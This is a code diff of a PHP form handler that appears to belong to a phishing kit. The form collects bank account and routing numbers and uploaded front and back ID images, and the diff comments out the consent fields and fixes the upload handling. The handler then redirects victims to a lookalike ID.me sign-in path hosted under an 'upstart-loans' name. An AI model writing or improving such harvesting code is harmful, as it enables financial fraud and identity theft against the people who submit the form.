@@ -57,8 +57,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $savings_account = htmlspecialchars($_POST['q109_savingsAccount'] ?? '');
     $routing_number = htmlspecialchars($_POST['q114_routingNumber'] ?? '');
 
-    $i_authorize = htmlspecialchars($_POST['q51_iAuthorize51'] ?? '');
-    $i_hereby_agree = htmlspecialchars($_POST['q52_iHereby'] ?? '');
+    // $i_authorize = htmlspecialchars($_POST['q51_iAuthorize51'] ?? '');
+    // $i_hereby_agree = htmlspecialchars($_POST['q52_iHereby'] ?? '');
 
 
     $timestamp = date("Y-m-d H:i:s");
@@ -93,8 +93,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
     // Handle file uploads
-    $front_id_path = handleFileUpload('q94_uploadSelected94[]', 'front_id');
-    $back_id_path = handleFileUpload('q95_uploadBack[]', 'back_id');
+    $front_id_path = handleFileUpload('q94_uploadSelected94', 'front_id');
+    $back_id_path = handleFileUpload('q95_uploadBack', 'back_id');
 
 
 
@@ -203,7 +203,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
 
-    
 exit;
 }
 ?>
